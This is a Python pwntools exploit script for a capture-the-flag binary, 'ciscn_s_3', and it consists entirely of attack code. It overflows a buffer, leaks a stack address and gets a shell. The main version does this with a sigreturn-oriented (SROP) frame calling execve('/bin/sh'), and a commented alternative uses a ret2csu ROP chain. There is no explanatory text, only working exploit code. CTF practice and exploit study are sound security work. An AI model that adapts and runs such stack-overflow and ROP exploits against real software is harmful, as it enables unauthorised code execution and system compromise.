from pwn import *

context(arch='amd64', os='linux', log_level = 'DEBUG')

p = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')

syscall = 0x400517
mov_rax_0f = 0x4004da

payload = 'a'*16 + p64(elf.sym['vuln'])
p.sendline(payload)
p.recv(0x20)
stack = u64(p.recv(8))-0x118
log.success('stack: ' + hex(stack))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack
frame.rip = syscall

payload = flat('/bin/sh\x00'*2,mov_rax_0f,syscall) + str(frame)
p.sendline(payload)

p.interactive()

'''OR
from pwn import *

context(arch='amd64', os='linux', log_level = 'DEBUG')

p = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')

syscall = 0x400517
mov_rax_3b = 0x4004e2
pop_rdi = 0x4005a3
csu_1 = 0x400580
csu_2 = 0x40059a

payload = 'a'*16 + p64(elf.sym['main'])
p.sendline(payload)
p.recv(0x20)
stack = u64(p.recv(8))-0x118
log.success('stack: ' + hex(stack))

payload = flat(['/bin/sh\x00',pop_rdi,mov_rax_3b,csu_2,0,1,stack-0x18,0,0,0,csu_1,pop_rdi,stack-0x20,syscall])
p.sendline(payload)

p.interactive()
'''